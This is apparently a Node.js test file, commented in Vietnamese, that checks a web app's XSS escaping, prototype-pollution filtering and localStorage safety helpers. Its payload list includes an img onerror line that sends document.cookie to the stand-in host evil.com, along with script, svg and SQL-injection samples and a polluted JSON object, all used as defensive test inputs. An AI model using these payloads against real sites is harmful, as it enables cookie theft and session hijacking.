/**
 * ==============================================================================
 * TEST SUITE: KIỂM THỬ AN TOÀN TRÌNH DUYỆT (DOM XSS & STORAGE SECURITY)
 * File: scripts/test_dom_storage_security.js
 * ==============================================================================
 */

const assert = require('assert');
const fs = require('fs');
const path = require('path');

console.log('=== KIỂM THỬ BẢO MẬT PHÍA TRÌNH DUYỆT (DOM XSS & STORAGE SECURITY) ===\n');

// Đọc app.js
const appPath = path.join(__dirname, '..', 'app.js');
const appCode = fs.readFileSync(appPath, 'utf8');

// Giả lập môi trường DOM & LocalStorage
const mockStorage = new Map();
global.localStorage = {
  getItem: (key) => mockStorage.has(key) ? mockStorage.get(key) : null,
  setItem: (key, val) => mockStorage.set(key, String(val)),
  removeItem: (key) => mockStorage.delete(key),
  clear: () => mockStorage.clear()
};

global.document = {
  documentElement: {
    setAttribute: () => {},
    getAttribute: () => null,
    clientWidth: 1024
  },
  getElementById: (id) => ({
    id,
    classList: { add: () => {}, remove: () => {}, toggle: () => {}, contains: () => false },
    setAttribute: () => {},
    addEventListener: () => {},
    textContent: '',
    innerHTML: ''
  }),
  querySelectorAll: () => [],
  addEventListener: () => {}
};

global.window = {
  localStorage: global.localStorage,
  document: global.document,
  innerWidth: 1024,
  addEventListener: () => {},
  speechSynthesis: { getVoices: () => [] }
};

// Nạp các hàm bảo mật từ app.js
const extractFn = (name) => {
  const match = appCode.match(new RegExp(`function\\s+${name}\\s*\\([^)]*\\)\\s*\\{[\\s\\S]*?\\n\\}`));
  if (!match) throw new Error(`Không tìm thấy hàm ${name} trong app.js`);
  return new Function(`return (${match[0]})`)();
};

const escapeHtml = extractFn('escapeHtml');
const isSafeObjectKey = extractFn('isSafeObjectKey');
global.isSafeObjectKey = isSafeObjectKey;

const sanitizeDeepObject = extractFn('sanitizeDeepObject');
global.sanitizeDeepObject = sanitizeDeepObject;

const safeGetStorage = extractFn('safeGetStorage');
global.safeGetStorage = safeGetStorage;

const safeSetStorage = extractFn('safeSetStorage');
global.safeSetStorage = safeSetStorage;

const safeGetJsonStorage = extractFn('safeGetJsonStorage');
global.safeGetJsonStorage = safeGetJsonStorage;

// ----------------------------------------------------------------------------
// 1. KIỂM THỬ HÀM ESCAPE HTML CHỐNG DOM XSS
// ----------------------------------------------------------------------------
console.log('--- TEST 1: Kiểm thử escapeHtml chống tiêm mã độc XSS ---');
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror="fetch(\'http://evil.com/?c=\'+document.cookie)">',
  '"><svg/onload=alert(document.domain)>',
  'javascript:alert(1)',
  '\' OR \'1\'=\'1',
  '<b>Đậm</b> & <i>Nghiêng</i> "Kép" \'Đơn\''
];

for (const payload of xssPayloads) {
  const escaped = escapeHtml(payload);
  assert.ok(!escaped.includes('<script>'), `Phải escape thẻ script trong: ${payload}`);
  assert.ok(!escaped.includes('<img'), `Phải escape thẻ img trong: ${payload}`);
  assert.ok(!escaped.includes('<svg'), `Phải escape thẻ svg trong: ${payload}`);
  assert.ok(!escaped.includes('"'), `Phải escape dấu ngoặc kép trong: ${payload}`);
  assert.ok(!escaped.includes('<'), `Phải escape dấu < trong: ${payload}`);
  assert.ok(!escaped.includes('>'), `Phải escape dấu > trong: ${payload}`);
  console.log(`  ✓ Escape thành công: "${payload.slice(0, 30)}..." ➔ "${escaped.slice(0, 30)}..."`);
}

// ----------------------------------------------------------------------------
// 2. KIỂM THỬ CHỐNG PROTOTYPE POLLUTION (isSafeObjectKey & sanitizeDeepObject)
// ----------------------------------------------------------------------------
console.log('\n--- TEST 2: Kiểm thử chống Prototype Pollution ---');
assert.strictEqual(isSafeObjectKey('__proto__'), false);
assert.strictEqual(isSafeObjectKey('constructor'), false);
assert.strictEqual(isSafeObjectKey('prototype'), false);
assert.strictEqual(isSafeObjectKey('validKey'), true);
assert.strictEqual(isSafeObjectKey('bai-1'), true);
console.log('  ✓ isSafeObjectKey chặn chính xác các khóa nguy hiểm (__proto__, constructor, prototype)');

const maliciousObject = JSON.parse(`{
  "__proto__": { "polluted": true },
  "constructor": { "prototype": { "polluted": true } },
  "lessonId": "bai-1",
  "score": 100,
  "nested": {
    "__proto__": { "isAdmin": true },
    "safeData": "ok"
  }
}`);

const sanitized = sanitizeDeepObject(maliciousObject);
assert.strictEqual(Object.prototype.polluted, undefined, 'Object.prototype không được bị ô nhiễm!');
assert.strictEqual(sanitized.__proto__, undefined, '__proto__ phải bị loại bỏ hoàn toàn');
assert.strictEqual(sanitized.constructor, undefined, 'constructor phải bị loại bỏ');
assert.strictEqual(sanitized.lessonId, 'bai-1');
assert.strictEqual(sanitized.score, 100);
assert.strictEqual(sanitized.nested.safeData, 'ok');
assert.strictEqual(sanitized.nested.__proto__, undefined);
console.log('  ✓ sanitizeDeepObject lọc sạch toàn bộ các thuộc tính ô nhiễm đệ quy sâu.');

// ----------------------------------------------------------------------------
// 3. KIỂM THỬ safeGetJsonStorage VỚI BỘ LỌC KIỂU DỮ LIỆU & BẢO VỆ LỖI
// ----------------------------------------------------------------------------
console.log('\n--- TEST 3: Kiểm thử safeGetJsonStorage ---');
// 3A. Dữ liệu mảng hợp lệ
mockStorage.set('test_array_key', JSON.stringify(['bai-1', 'bai-2', 'quiz-1']));
const arr = safeGetJsonStorage('test_array_key', [], Array.isArray);
assert.deepStrictEqual(arr, ['bai-1', 'bai-2', 'quiz-1']);
console.log('  ✓ Đọc mảng JSON an toàn thành công');

// 3B. Dữ liệu sai định dạng JSON (Corrupted string)
mockStorage.set('test_corrupt_key', '{ bad json ...');
const fallbackArr = safeGetJsonStorage('test_corrupt_key', ['fallback']);
assert.deepStrictEqual(fallbackArr, ['fallback']);
console.log('  ✓ Bắt lỗi JSON hỏng êm dịu, không crash ứng dụng');

// 3C. Dữ liệu sai kiểu (giả mạo object thành number hoặc string)
mockStorage.set('test_fake_array', JSON.stringify({ hacked: true }));
const validated = safeGetJsonStorage('test_fake_array', [], Array.isArray);
assert.deepStrictEqual(validated, [], 'Validator phải từ chối khi kiểu dữ liệu không khớp Array.isArray');
console.log('  ✓ Validator ngăn chặn dữ liệu giả mạo kiểu thành công');

// ----------------------------------------------------------------------------
// 4. KIỂM THỬ XỬ LÝ VƯỢT QUOTA STORAGE (QUOTA EXCEEDED HANDLING)
// ----------------------------------------------------------------------------
console.log('\n--- TEST 4: Kiểm thử an toàn bộ nhớ Storage Quota ---');
const originalSetItem = global.localStorage.setItem;
global.localStorage.setItem = () => {
  const err = new Error('QuotaExceededError');
  err.name = 'QuotaExceededError';
  throw err;
};

// Không được gây Exception làm sập giao diện người dùng
let threw = false;
try {
  safeSetStorage('quota_test', 'large_data');
} catch (e) {
  threw = true;
}
assert.strictEqual(threw, false, 'safeSetStorage phải tự bắt lỗi QuotaExceededError mà không crash');
global.localStorage.setItem = originalSetItem;
console.log('  ✓ safeSetStorage bắt lỗi tràn bộ nhớ localStorage an toàn.');

// ----------------------------------------------------------------------------
// 5. KIỂM THỬ RÀ SOÁT CODE APP.JS ĐẢM BẢO KHÔNG CÒN LỖ HỔNG XSS TRONG SEARCH/CONFIRM/TOAST
// ----------------------------------------------------------------------------
console.log('\n--- TEST 5: Rà soát các điểm render innerHTML trong app.js ---');
// Kiểm tra search-empty
assert.ok(
  appCode.includes('list.innerHTML = `<div class="search-empty">Không tìm thấy cho "<strong>${escapeHtml(val)}</strong>"'),
  'Search empty phải sử dụng escapeHtml(val)'
);
console.log('  ✓ Điểm render tìm kiếm rỗng đã bọc escapeHtml');

// Kiểm tra search item title, sub, category
assert.ok(
  appCode.includes('${escapeHtml(r.title)}'),
  'Search result title phải sử dụng escapeHtml'
);
assert.ok(
  appCode.includes('${escapeHtml(r.sub)}'),
  'Search result sub phải sử dụng escapeHtml'
);
console.log('  ✓ Điểm render danh sách kết quả tìm kiếm đã bọc escapeHtml');

// Kiểm tra confirm modal message
assert.ok(
  appCode.includes('msgEl.innerHTML = escapeHtml(String(message || \'\')).replace(/\\n/g, \'<br>\');'),
  'showAppConfirm phải escapeHtml message trước khi replace newline'
);
console.log('  ✓ Điểm render thông báo xác nhận showAppConfirm đã bọc escapeHtml');

// Kiểm tra toast notification
assert.ok(
  appCode.includes('toast.innerHTML = escapeHtml(String(message || \'\'));'),
  'showToast phải bọc escapeHtml'
);
console.log('  ✓ Điểm render thông báo Toast đã bọc escapeHtml');

console.log('\n=== TẤT CẢ KIỂM THỬ BẢO MẬT TRÌNH DUYỆT (DOM/STORAGE) ĐẠT 100% THÀNH CÔNG! ===');
